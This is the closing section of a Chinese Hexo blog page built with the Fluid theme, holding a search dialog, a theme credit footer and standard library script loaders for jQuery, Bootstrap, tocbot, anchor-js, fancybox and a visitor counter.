      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Candy</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
